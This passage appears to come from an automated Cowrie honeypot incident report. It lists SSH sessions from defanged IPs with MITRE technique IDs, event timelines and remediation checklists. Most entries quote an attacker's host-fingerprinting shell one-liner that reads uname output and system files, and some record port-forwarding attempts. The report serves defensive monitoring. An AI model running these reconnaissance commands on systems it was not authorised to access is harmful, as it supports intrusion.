| `2026-07-06 12:58:04` | `cowrie.session.params` |
| `2026-07-06 12:58:04` | `cowrie.command.input` |
| `2026-07-06 12:58:06` | `cowrie.log.closed` |
| `2026-07-06 12:58:06` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `45.198.224[.]120` to AbuseIPDB if not already reported
- [ ] Block `45.198.224[.]120` at perimeter firewall / security group
- [ ] Review commands for lateral movement indicators
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-b1a098ab9606

| Field | Detail |
|---|---|
| **Source IP** | `91.92.40[.]6` |
| **First Seen** | 2026-07-06 12:58 |
| **Last Seen** | 2026-07-06 12:58 |
| **Session Duration** | 3s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **Commands Executed** | `export PATH=/usr/local/sbin:/usr/local/bin:/usr/sbin:/usr/bin:/sbin:/bin:$PATH; uname=$(uname -s -v -n -m 2>/dev/null || /bin/uname -s -v -n -m 2>/dev/null || /usr/bin/uname -s -v -n -m 2>/dev/null || busybox uname -s -v -n -m 2>/dev/null || ( [ -f /proc/version ] && head -1 /proc/version | cut -d' ' -f1 ) || ( [ -f /etc/os-release ] && grep '^ID=' /etc/os-release | cut -d= -f2 | tr -d '"' ) || echo ""); arch=$(uname -m 2>/dev/null || /bin/uname -m 2>/dev/null || /usr/bin/uname -m 2>/dev/null || busybox una, uname -s -v -n -m 2 > /dev/null, /bin/uname -s -v -n -m 2 > /dev/null, /usr/bin/uname -s -v -n -m 2 > /dev/null, busybox uname -s -v -n -m 2 > /dev/null` |
| **TTPs (MITRE)** | T1059.004 · T1078 · T1083 · T1222.002 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-07-06 12:58:09` | `cowrie.session.connect` |
| `2026-07-06 12:58:09` | `cowrie.client.version` |
| `2026-07-06 12:58:09` | `cowrie.client.kex` |
| `2026-07-06 12:58:10` | `cowrie.login.success` |
| `2026-07-06 12:58:11` | `cowrie.session.params` |
| `2026-07-06 12:58:11` | `cowrie.command.input` |
| `2026-07-06 12:58:11` | `cowrie.command.input` |
| `2026-07-06 12:58:11` | `cowrie.command.input` |
| `2026-07-06 12:58:11` | `cowrie.command.input` |
| `2026-07-06 12:58:11` | `cowrie.command.input` |
| `2026-07-06 12:58:11` | `cowrie.command.success` |
| `2026-07-06 12:58:11` | `cowrie.command.input` |
| `2026-07-06 12:58:11` | `cowrie.command.input` |
| `2026-07-06 12:58:11` | `cowrie.command.input` |
| `2026-07-06 12:58:11` | `cowrie.command.input` |
| `2026-07-06 12:58:12` | `cowrie.log.closed` |
| `2026-07-06 12:58:12` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `91.92.40[.]6` to AbuseIPDB if not already reported
- [ ] Block `91.92.40[.]6` at perimeter firewall / security group
- [ ] Review commands for lateral movement indicators
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-85c68828891a

| Field | Detail |
|---|---|
| **Source IP** | `176.53.159[.]196` |
| **First Seen** | 2026-07-06 12:58 |
| **Last Seen** | 2026-07-06 12:58 |
| **Session Duration** | 0s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **TCP Tunnel** | ⚠️ `cowrie.direct-tcpip` — port forwarding / proxy attempt |
| **TTPs (MITRE)** | T1078 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-07-06 12:58:30` | `cowrie.session.connect` |
| `2026-07-06 12:58:30` | `cowrie.client.version` |
| `2026-07-06 12:58:30` | `cowrie.client.kex` |
| `2026-07-06 12:58:30` | `cowrie.login.success` |
| `2026-07-06 12:58:30` | `cowrie.direct-tcpip.request` |
| `2026-07-06 12:58:31` | `cowrie.direct-tcpip.data` |
| `2026-07-06 12:58:31` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `176.53.159[.]196` to AbuseIPDB if not already reported
- [ ] Block `176.53.159[.]196` at perimeter firewall / security group
- [ ] Investigate TCP tunnel target — port forwarding via honeypot
- [ ] Confirm tunnel target is not internal infrastructure
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-d3598cdee86e

| Field | Detail |
|---|---|
| **Source IP** | `91.92.40[.]176` |
| **First Seen** | 2026-07-06 12:58 |
| **Last Seen** | 2026-07-06 12:59 |
| **Session Duration** | 37s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **Commands Executed** | `export PATH=/usr/local/sbin:/usr/local/bin:/usr/sbin:/usr/bin:/sbin:/bin:$PATH; uname=$(uname -s -v -n -m 2>/dev/null || /bin/uname -s -v -n -m 2>/dev/null || /usr/bin/uname -s -v -n -m 2>/dev/null || busybox uname -s -v -n -m 2>/dev/null || ( [ -f /proc/version ] && head -1 /proc/version | cut -d' ' -f1 ) || ( [ -f /etc/os-release ] && grep '^ID=' /etc/os-release | cut -d= -f2 | tr -d '"' ) || echo ""); arch=$(uname -m 2>/dev/null || /bin/uname -m 2>/dev/null || /usr/bin/uname -m 2>/dev/null || busybox una, uname -s -v -n -m 2 > /dev/null, /bin/uname -s -v -n -m 2 > /dev/null, /usr/bin/uname -s -v -n -m 2 > /dev/null, busybox uname -s -v -n -m 2 > /dev/null` |
| **TTPs (MITRE)** | T1059.004 · T1078 · T1083 · T1222.002 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-07-06 12:58:53` | `cowrie.session.connect` |
| `2026-07-06 12:58:58` | `cowrie.client.version` |
| `2026-07-06 12:58:58` | `cowrie.client.kex` |
| `2026-07-06 12:59:16` | `cowrie.login.success` |
| `2026-07-06 12:59:24` | `cowrie.session.params` |
| `2026-07-06 12:59:24` | `cowrie.command.input` |
| `2026-07-06 12:59:24` | `cowrie.command.input` |
| `2026-07-06 12:59:24` | `cowrie.command.input` |
| `2026-07-06 12:59:24` | `cowrie.command.input` |
| `2026-07-06 12:59:24` | `cowrie.command.input` |
| `2026-07-06 12:59:24` | `cowrie.command.success` |
| `2026-07-06 12:59:24` | `cowrie.command.input` |
| `2026-07-06 12:59:24` | `cowrie.command.input` |
| `2026-07-06 12:59:24` | `cowrie.command.input` |
| `2026-07-06 12:59:24` | `cowrie.command.input` |
| `2026-07-06 12:59:28` | `cowrie.log.closed` |
| `2026-07-06 12:59:31` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `91.92.40[.]176` to AbuseIPDB if not already reported
- [ ] Block `91.92.40[.]176` at perimeter firewall / security group
- [ ] Review commands for lateral movement indicators
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-f5dab90220d7

| Field | Detail |
|---|---|
| **Source IP** | `91.92.40[.]6` |
| **First Seen** | 2026-07-06 12:59 |
| **Last Seen** | 2026-07-06 12:59 |
| **Session Duration** | 3s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **Commands Executed** | `export PATH=/usr/local/sbin:/usr/local/bin:/usr/sbin:/usr/bin:/sbin:/bin:$PATH; uname=$(uname -s -v -n -m 2>/dev/null || /bin/uname -s -v -n -m 2>/dev/null || /usr/bin/uname -s -v -n -m 2>/dev/null || busybox uname -s -v -n -m 2>/dev/null || ( [ -f /proc/version ] && head -1 /proc/version | cut -d' ' -f1 ) || ( [ -f /etc/os-release ] && grep '^ID=' /etc/os-release | cut -d= -f2 | tr -d '"' ) || echo ""); arch=$(uname -m 2>/dev/null || /bin/uname -m 2>/dev/null || /usr/bin/uname -m 2>/dev/null || busybox una, uname -s -v -n -m 2 > /dev/null, /bin/uname -s -v -n -m 2 > /dev/null, /usr/bin/uname -s -v -n -m 2 > /dev/null, busybox uname -s -v -n -m 2 > /dev/null` |
| **TTPs (MITRE)** | T1059.004 · T1078 · T1083 · T1222.002 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-07-06 12:59:31` | `cowrie.session.connect` |
| `2026-07-06 12:59:32` | `cowrie.client.version` |
| `2026-07-06 12:59:32` | `cowrie.client.kex` |
| `2026-07-06 12:59:33` | `cowrie.login.success` |
| `2026-07-06 12:59:34` | `cowrie.session.params` |
| `2026-07-06 12:59:34` | `cowrie.command.input` |
| `2026-07-06 12:59:34` | `cowrie.command.input` |
| `2026-07-06 12:59:34` | `cowrie.command.input` |
| `2026-07-06 12:59:34` | `cowrie.command.input` |
| `2026-07-06 12:59:34` | `cowrie.command.input` |
| `2026-07-06 12:59:34` | `cowrie.command.success` |
| `2026-07-06 12:59:34` | `cowrie.command.input` |
| `2026-07-06 12:59:34` | `cowrie.command.input` |
| `2026-07-06 12:59:34` | `cowrie.command.input` |
| `2026-07-06 12:59:34` | `cowrie.command.input` |
| `2026-07-06 12:59:34` | `cowrie.log.closed` |
| `2026-07-06 12:59:35` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `91.92.40[.]6` to AbuseIPDB if not already reported
- [ ] Block `91.92.40[.]6` at perimeter firewall / security group
- [ ] Review commands for lateral movement indicators
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-479d6a827e8e

| Field | Detail |
|---|---|
| **Source IP** | `91.92.40[.]6` |
| **First Seen** | 2026-07-06 13:00 |
| **Last Seen** | 2026-07-06 13:00 |
| **Session Duration** | 3s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **Commands Executed** | `export PATH=/usr/local/sbin:/usr/local/bin:/usr/sbin:/usr/bin:/sbin:/bin:$PATH; uname=$(uname -s -v -n -m 2>/dev/null || /bin/uname -s -v -n -m 2>/dev/null || /usr/bin/uname -s -v -n -m 2>/dev/null || busybox uname -s -v -n -m 2>/dev/null || ( [ -f /proc/version ] && head -1 /proc/version | cut -d' ' -f1 ) || ( [ -f /etc/os-release ] && grep '^ID=' /etc/os-release | cut -d= -f2 | tr -d '"' ) || echo ""); arch=$(uname -m 2>/dev/null || /bin/uname -m 2>/dev/null || /usr/bin/uname -m 2>/dev/null || busybox una, uname -s -v -n -m 2 > /dev/null, /bin/uname -s -v -n -m 2 > /dev/null, /usr/bin/uname -s -v -n -m 2 > /dev/null, busybox uname -s -v -n -m 2 > /dev/null` |
| **TTPs (MITRE)** | T1059.004 · T1078 · T1083 · T1222.002 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-07-06 13:00:53` | `cowrie.session.connect` |
| `2026-07-06 13:00:54` | `cowrie.client.version` |
| `2026-07-06 13:00:54` | `cowrie.client.kex` |
| `2026-07-06 13:00:55` | `cowrie.login.success` |
| `2026-07-06 13:00:56` | `cowrie.session.params` |
| `2026-07-06 13:00:56` | `cowrie.command.input` |
| `2026-07-06 13:00:56` | `cowrie.command.input` |
| `2026-07-06 13:00:56` | `cowrie.command.input` |
| `2026-07-06 13:00:56` | `cowrie.command.input` |
| `2026-07-06 13:00:56` | `cowrie.command.input` |
| `2026-07-06 13:00:56` | `cowrie.command.success` |
| `2026-07-06 13:00:56` | `cowrie.command.input` |
| `2026-07-06 13:00:56` | `cowrie.command.input` |
| `2026-07-06 13:00:56` | `cowrie.command.input` |
| `2026-07-06 13:00:56` | `cowrie.command.input` |
| `2026-07-06 13:00:56` | `cowrie.log.closed` |
| `2026-07-06 13:00:57` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `91.92.40[.]6` to AbuseIPDB if not already reported
- [ ] Block `91.92.40[.]6` at perimeter firewall / security group
- [ ] Review commands for lateral movement indicators
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-03c1b0abcd44

| Field | Detail |
|---|---|
| **Source IP** | `91.92.40[.]176` |
| **First Seen** | 2026-07-06 13:01 |
| **Last Seen** | 2026-07-06 13:01 |
| **Session Duration** | 38s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **Commands Executed** | `export PATH=/usr/local/sbin:/usr/local/bin:/usr/sbin:/usr/bin:/sbin:/bin:$PATH; uname=$(uname -s -v -n -m 2>/dev/null || /bin/uname -s -v -n -m 2>/dev/null || /usr/bin/uname -s -v -n -m 2>/dev/null || busybox uname -s -v -n -m 2>/dev/null || ( [ -f /proc/version ] && head -1 /proc/version | cut -d' ' -f1 ) || ( [ -f /etc/os-release ] && grep '^ID=' /etc/os-release | cut -d= -f2 | tr -d '"' ) || echo ""); arch=$(uname -m 2>/dev/null || /bin/uname -m 2>/dev/null || /usr/bin/uname -m 2>/dev/null || busybox una, uname -s -v -n -m 2 > /dev/null, /bin/uname -s -v -n -m 2 > /dev/null, /usr/bin/uname -s -v -n -m 2 > /dev/null, busybox uname -s -v -n -m 2 > /dev/null` |
| **TTPs (MITRE)** | T1059.004 · T1078 · T1083 · T1222.002 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-07-06 13:01:13` | `cowrie.session.connect` |
| `2026-07-06 13:01:17` | `cowrie.client.version` |
| `2026-07-06 13:01:17` | `cowrie.client.kex` |
| `2026-07-06 13:01:34` | `cowrie.login.success` |
| `2026-07-06 13:01:43` | `cowrie.session.params` |
| `2026-07-06 13:01:43` | `cowrie.command.input` |
| `2026-07-06 13:01:43` | `cowrie.command.input` |
| `2026-07-06 13:01:43` | `cowrie.command.input` |
| `2026-07-06 13:01:43` | `cowrie.command.input` |
| `2026-07-06 13:01:43` | `cowrie.command.input` |
| `2026-07-06 13:01:43` | `cowrie.command.success` |
| `2026-07-06 13:01:43` | `cowrie.command.input` |
| `2026-07-06 13:01:43` | `cowrie.command.input` |
| `2026-07-06 13:01:43` | `cowrie.command.input` |
| `2026-07-06 13:01:43` | `cowrie.command.input` |
| `2026-07-06 13:01:47` | `cowrie.log.closed` |
| `2026-07-06 13:01:51` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `91.92.40[.]176` to AbuseIPDB if not already reported
- [ ] Block `91.92.40[.]176` at perimeter firewall / security group
- [ ] Review commands for lateral movement indicators
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-fe52195780a0

| Field | Detail |
|---|---|
| **Source IP** | `91.92.40[.]6` |
| **First Seen** | 2026-07-06 13:02 |
| **Last Seen** | 2026-07-06 13:02 |
| **Session Duration** | 3s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **Commands Executed** | `export PATH=/usr/local/sbin:/usr/local/bin:/usr/sbin:/usr/bin:/sbin:/bin:$PATH; uname=$(uname -s -v -n -m 2>/dev/null || /bin/uname -s -v -n -m 2>/dev/null || /usr/bin/uname -s -v -n -m 2>/dev/null || busybox uname -s -v -n -m 2>/dev/null || ( [ -f /proc/version ] && head -1 /proc/version | cut -d' ' -f1 ) || ( [ -f /etc/os-release ] && grep '^ID=' /etc/os-release | cut -d= -f2 | tr -d '"' ) || echo ""); arch=$(uname -m 2>/dev/null || /bin/uname -m 2>/dev/null || /usr/bin/uname -m 2>/dev/null || busybox una, uname -s -v -n -m 2 > /dev/null, /bin/uname -s -v -n -m 2 > /dev/null, /usr/bin/uname -s -v -n -m 2 > /dev/null, busybox uname -s -v -n -m 2 > /dev/null` |
| **TTPs (MITRE)** | T1059.004 · T1078 · T1083 · T1222.002 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-07-06 13:02:15` | `cowrie.session.connect` |
| `2026-07-06 13:02:15` | `cowrie.client.version` |
| `2026-07-06 13:02:15` | `cowrie.client.kex` |
| `2026-07-06 13:02:17` | `cowrie.login.success` |
| `2026-07-06 13:02:18` | `cowrie.session.params` |
| `2026-07-06 13:02:18` | `cowrie.command.input` |
| `2026-07-06 13:02:18` | `cowrie.command.input` |
| `2026-07-06 13:02:18` | `cowrie.command.input` |
| `2026-07-06 13:02:18` | `cowrie.command.input` |
| `2026-07-06 13:02:18` | `cowrie.command.input` |
| `2026-07-06 13:02:18` | `cowrie.command.success` |
| `2026-07-06 13:02:18` | `cowrie.command.input` |
| `2026-07-06 13:02:18` | `cowrie.command.input` |
| `2026-07-06 13:02:18` | `cowrie.command.input` |
| `2026-07-06 13:02:18` | `cowrie.command.input` |
| `2026-07-06 13:02:18` | `cowrie.log.closed` |
| `2026-07-06 13:02:18` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `91.92.40[.]6` to AbuseIPDB if not already reported
- [ ] Block `91.92.40[.]6` at perimeter firewall / security group
- [ ] Review commands for lateral movement indicators
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-a0975ed4ed68

| Field | Detail |
|---|---|
| **Source IP** | `176.53.159[.]196` |
| **First Seen** | 2026-07-06 13:03 |
| **Last Seen** | 2026-07-06 13:03 |
| **Session Duration** | 0s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **TCP Tunnel** | ⚠️ `cowrie.direct-tcpip` — port forwarding / proxy attempt |
| **TTPs (MITRE)** | T1078 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-07-06 13:03:31` | `cowrie.session.connect` |
| `2026-07-06 13:03:31` | `cowrie.client.version` |
| `2026-07-06 13:03:31` | `cowrie.client.kex` |
| `2026-07-06 13:03:31` | `cowrie.login.success` |
| `2026-07-06 13:03:32` | `cowrie.direct-tcpip.request` |
| `2026-07-06 13:03:32` | `cowrie.direct-tcpip.data` |
| `2026-07-06 13:03:32` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `176.53.159[.]196` to AbuseIPDB if not already reported
- [ ] Block `176.53.159[.]196` at perimeter firewall / security group
- [ ] Investigate TCP tunnel target — port forwarding via honeypot
- [ ] Confirm tunnel target is not internal infrastructure
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-02caa40654dd

| Field | Detail |
|---|---|
| **Source IP** | `91.92.40[.]176` |
| **First Seen** | 2026-07-06 13:03 |
| **Last Seen** | 2026-07-06 13:04 |
| **Session Duration** | 37s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **Commands Executed** | `export PATH=/usr/local/sbin:/usr/local/bin:/usr/sbin:/usr/bin:/sbin:/bin:$PATH; uname=$(uname -s -v -n -m 2>/dev/null || /bin/uname -s -v -n -m 2>/dev/null || /usr/bin/uname -s -v -n -m 2>/dev/null || busybox uname -s -v -n -m 2>/dev/null || ( [ -f /proc/version ] && head -1 /proc/version | cut -d' ' -f1 ) || ( [ -f /etc/os-release ] && grep '^ID=' /etc/os-release | cut -d= -f2 | tr -d '"' ) || echo ""); arch=$(uname -m 2>/dev/null || /bin/uname -m 2>/dev/null || /usr/bin/uname -m 2>/dev/null || busybox una, uname -s -v -n -m 2 > /dev/null, /bin/uname -s -v -n -m 2 > /dev/null, /usr/bin/uname -s -v -n -m 2 > /dev/null, busybox uname -s -v -n -m 2 > /dev/null` |
| **TTPs (MITRE)** | T1059.004 · T1078 · T1083 · T1222.002 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-07-06 13:03:34` | `cowrie.session.connect` |
| `2026-07-06 13:03:39` | `cowrie.client.version` |
| `2026-07-06 13:03:39` | `cowrie.client.kex` |
| `2026-07-06 13:03:56` | `cowrie.login.success` |
| `2026-07-06 13:04:05` | `cowrie.session.params` |
| `2026-07-06 13:04:05` | `cowrie.command.input` |
| `2026-07-06 13:04:05` | `cowrie.command.input` |
| `2026-07-06 13:04:05` | `cowrie.command.input` |
| `2026-07-06 13:04:05` | `cowrie.command.input` |
| `2026-07-06 13:04:05` | `cowrie.command.input` |
| `2026-07-06 13:04:05` | `cowrie.command.success` |
| `2026-07-06 13:04:05` | `cowrie.command.input` |
| `2026-07-06 13:04:05` | `cowrie.command.input` |
| `2026-07-06 13:04:05` | `cowrie.command.input` |
| `2026-07-06 13:04:05` | `cowrie.command.input` |
| `2026-07-06 13:04:09` | `cowrie.log.closed` |
| `2026-07-06 13:04:12` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `91.92.40[.]176` to AbuseIPDB if not already reported
- [ ] Block `91.92.40[.]176` at perimeter firewall / security group
- [ ] Review commands for lateral movement indicators
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-929fc99b2546

| Field | Detail |
|---|---|
| **Source IP** | `91.92.40[.]6` |
| **First Seen** | 2026-07-06 13:03 |
| **Last Seen** | 2026-07-06 13:03 |
| **Session Duration** | 3s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **Commands Executed** | `export PATH=/usr/local/sbin:/usr/local/bin:/usr/sbin:/usr/bin:/sbin:/bin:$PATH; uname=$(uname -s -v -n -m 2>/dev/null || /bin/uname -s -v -n -m 2>/dev/null || /usr/bin/uname -s -v -n -m 2>/dev/null || busybox uname -s -v -n -m 2>/dev/null || ( [ -f /proc/version ] && head -1 /proc/version | cut -d' ' -f1 ) || ( [ -f /etc/os-release ] && grep '^ID=' /etc/os-release | cut -d= -f2 | tr -d '"' ) || echo ""); arch=$(uname -m 2>/dev/null || /bin/uname -m 2>/dev/null || /usr/bin/uname -m 2>/dev/null || busybox una, uname -s -v -n -m 2 > /dev/null, /bin/uname -s -v -n -m 2 > /dev/null, /usr/bin/uname -s -v -n -m 2 > /dev/null, busybox uname -s -v -n -m 2 > /dev/null` |
| **TTPs (MITRE)** | T1059.004 · T1078 · T1083 · T1222.002 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-07-06 13:03:39` | `cowrie.session.connect` |
| `2026-07-06 13:03:39` | `cowrie.client.version` |
| `2026-07-06 13:03:39` | `cowrie.client.kex` |
| `2026-07-06 13:03:41` | `cowrie.login.success` |
| `2026-07-06 13:03:42` | `cowrie.session.params` |
| `2026-07-06 13:03:42` | `cowrie.command.input` |
| `2026-07-06 13:03:42` | `cowrie.command.input` |
| `2026-07-06 13:03:42` | `cowrie.command.input` |
| `2026-07-06 13:03:42` | `cowrie.command.input` |
| `2026-07-06 13:03:42` | `cowrie.command.input` |
| `2026-07-06 13:03:42` | `cowrie.command.success` |
| `2026-07-06 13:03:42` | `cowrie.command.input` |
| `2026-07-06 13:03:42` | `cowrie.command.input` |
| `2026-07-06 13:03:42` | `cowrie.command.input` |
| `2026-07-06 13:03:42` | `cowrie.command.input` |
| `2026-07-06 13:03:43` | `cowrie.log.closed` |
| `2026-07-06 13:03:43` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `91.92.40[.]6` to AbuseIPDB if not already reported
- [ ] Block `91.92.40[.]6` at perimeter firewall / security group
- [ ] Review commands for lateral movement indicators
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-3271df217c60

| Field | Detail |
|---|---|
| **Source IP** | `185.242.3[.]195` |
| **First Seen** | 2026-07-06 13:04 |
| **Last Seen** | 2026-07-06 13:04 |
| **Session Duration** | 1s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **Commands Executed** | `echo OK` |
| **TTPs (MITRE)** | T1078 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-07-06 13:04:17` | `cowrie.session.connect` |
| `2026-07-06 13:04:17` | `cowrie.client.version` |
| `2026-07-06 13:04:17` | `cowrie.client.kex` |
| `2026-07-06 13:04:17` | `cowrie.login.success` |
| `2026-07-06 13:04:18` | `cowrie.session.params` |
| `2026-07-06 13:04:18` | `cowrie.command.input` |
| `2026-07-06 13:04:18` | `cowrie.log.closed` |
| `2026-07-06 13:04:18` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `185.242.3[.]195` to AbuseIPDB if not already reported
- [ ] Block `185.242.3[.]195` at perimeter firewall / security group
- [ ] Review commands for lateral movement indicators
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-0264d579d328

| Field | Detail |
|---|---|
| **Source IP** | `91.92.40[.]6` |
| **First Seen** | 2026-07-06 13:05 |
| **Last Seen** | 2026-07-06 13:05 |
| **Session Duration** | 3s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **Commands Executed** | `export PATH=/usr/local/sbin:/usr/local/bin:/usr/sbin:/usr/bin:/sbin:/bin:$PATH; uname=$(uname -s -v -n -m 2>/dev/null || /bin/uname -s -v -n -m 2>/dev/null || /usr/bin/uname -s -v -n -m 2>/dev/null || busybox uname -s -v -n -m 2>/dev/null || ( [ -f /proc/version ] && head -1 /proc/version | cut -d' ' -f1 ) || ( [ -f /etc/os-release ] && grep '^ID=' /etc/os-release | cut -d= -f2 | tr -d '"' ) || echo ""); arch=$(uname -m 2>/dev/null || /bin/uname -m 2>/dev/null || /usr/bin/uname -m 2>/dev/null || busybox una, uname -s -v -n -m 2 > /dev/null, /bin/uname -s -v -n -m 2 > /dev/null, /usr/bin/uname -s -v -n -m 2 > /dev/null, busybox uname -s -v -n -m 2 > /dev/null` |
| **TTPs (MITRE)** | T1059.004 · T1078 · T1083 · T1222.002 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-07-06 13:05:04` | `cowrie.session.connect` |
| `2026-07-06 13:05:04` | `cowrie.client.version` |
| `2026-07-06 13:05:04` | `cowrie.client.kex` |
| `2026-07-06 13:05:05` | `cowrie.login.success` |
| `2026-07-06 13:05:07` | `cowrie.session.params` |
| `2026-07-06 13:05:07` | `cowrie.command.input` |
| `2026-07-06 13:05:07` | `cowrie.command.input` |
| `2026-07-06 13:05:07` | `cowrie.command.input` |
| `2026-07-06 13:05:07` | `cowrie.command.input` |
| `2026-07-06 13:05:07` | `cowrie.command.input` |
| `2026-07-06 13:05:07` | `cowrie.command.success` |
| `2026-07-06 13:05:07` | `cowrie.command.input` |
| `2026-07-06 13:05:07` | `cowrie.command.input` |
| `2026-07-06 13:05:07` | `cowrie.command.input` |
| `2026-07-06 13:05:07` | `cowrie.command.input` |
| `2026-07-06 13:05:07` | `cowrie.log.closed` |
| `2026-07-06 13:05:08` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `91.92.40[.]6` to AbuseIPDB if not already reported
- [ ] Block `91.92.40[.]6` at perimeter firewall / security group
- [ ] Review commands for lateral movement indicators
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-006cd7364a80

| Field | Detail |
|---|---|
| **Source IP** | `91.92.40[.]176` |
| **First Seen** | 2026-07-06 13:05 |
| **Last Seen** | 2026-07-06 13:06 |
| **Session Duration** | 33s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **Commands Executed** | `export PATH=/usr/local/sbin:/usr/local/bin:/usr/sbin:/usr/bin:/sbin:/bin:$PATH; uname=$(uname -s -v -n -m 2>/dev/null || /bin/uname -s -v -n -m 2>/dev/null || /usr/bin/uname -s -v -n -m 2>/dev/null || busybox uname -s -v -n -m 2>/dev/null || ( [ -f /proc/version ] && head -1 /proc/version | cut -d' ' -f1 ) || ( [ -f /etc/os-release ] && grep '^ID=' /etc/os-release | cut -d= -f2 | tr -d '"' ) || echo ""); arch=$(uname -m 2>/dev/null || /bin/uname -m 2>/dev/null || /usr/bin/uname -m 2>/dev/null || busybox una, uname -s -v -n -m 2 > /dev/null, /bin/uname -s -v -n -m 2 > /dev/null, /usr/bin/uname -s -v -n -m 2 > /dev/null, busybox uname -s -v -n -m 2 > /dev/null` |
| **TTPs (MITRE)** | T1059.004 · T1078 · T1083 · T1222.002 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-07-06 13:05:57` | `cowrie.session.connect` |
| `2026-07-06 13:06:00` | `cowrie.client.version` |
| `2026-07-06 13:06:00` | `cowrie.client.kex` |
| `2026-07-06 13:06:16` | `cowrie.login.success` |
| `2026-07-06 13:06:24` | `cowrie.session.params` |
| `2026-07-06 13:06:24` | `cowrie.command.input` |
| `2026-07-06 13:06:24` | `cowrie.command.input` |
| `2026-07-06 13:06:24` | `cowrie.command.input` |
| `2026-07-06 13:06:24` | `cowrie.command.input` |
| `2026-07-06 13:06:24` | `cowrie.command.input` |
| `2026-07-06 13:06:24` | `cowrie.command.success` |
| `2026-07-06 13:06:24` | `cowrie.command.input` |
| `2026-07-06 13:06:24` | `cowrie.command.input` |
| `2026-07-06 13:06:24` | `cowrie.command.input` |
| `2026-07-06 13:06:24` | `cowrie.command.input` |
| `2026-07-06 13:06:28` | `cowrie.log.closed` |
| `2026-07-06 13:06:31` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `91.92.40[.]176` to AbuseIPDB if not already reported
- [ ] Block `91.92.40[.]176` at perimeter firewall / security group
- [ ] Review commands for lateral movement indicators
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-fa3d1637d543

| Field | Detail |
|---|---|
| **Source IP** | `91.92.40[.]6` |
| **First Seen** | 2026-07-06 13:06 |
| **Last Seen** | 2026-07-06 13:06 |
| **Session Duration** | 3s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
